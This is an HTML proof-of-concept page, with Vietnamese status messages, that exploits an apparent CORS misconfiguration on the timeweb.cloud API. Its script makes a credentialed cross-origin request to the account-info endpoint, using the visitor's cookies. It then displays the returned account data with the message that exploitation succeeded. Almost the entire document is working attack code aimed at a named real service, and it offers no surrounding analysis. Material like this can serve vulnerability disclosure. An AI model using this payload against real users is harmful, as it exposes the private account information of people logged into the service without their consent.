<!DOCTYPE html>
<html>
<head>
    <title>CORS PoC - Timeweb</title>
</head>
<body>
    <h1>Timeweb CORS Exploit PoC</h1>
    <p>Trạng thái: <strong id="status">Đang gửi request...</strong></p>
    <pre id="result" style="background: #f4f4f4; padding: 10px; border: 1px solid #ccc; min-height: 100px;"></pre>

    <script>
        const targetUrl = "https://timeweb.cloud/api/v2/accounts/info";
        
        fetch(targetUrl, {
            method: 'GET',
            credentials: 'include', // Bắt buộc để gửi cookie
            headers: {
                'Accept': 'application/json'
            }
        })
        .then(response => {
            document.getElementById("status").innerText = "HTTP Status: " + response.status;
            if (response.ok) {
                return response.json();
            } else {
                throw new Error("Bị chặn bởi trình duyệt hoặc lỗi xác thực. Status: " + response.status);
            }
        })
        .then(data => {
            document.getElementById("status").innerText = "KHAI THÁC THÀNH CÔNG!";
            document.getElementById("status").style.color = "green";
            document.getElementById("result").innerText = JSON.stringify(data, null, 2);
        })
        .catch(error => {
            document.getElementById("status").innerText = "LỖI (Xem chi tiết bên dưới)";
            document.getElementById("status").style.color = "red";
            document.getElementById("result").innerText = error.message + "\n\nLưu ý: Nếu bạn thấy lỗi CORS hoặc 401, hãy mở tab Network (F12) để kiểm tra xem cookie có được gửi đi không.";
            console.error("PoC Error:", error);
        });
    </script>
</body>
</html>
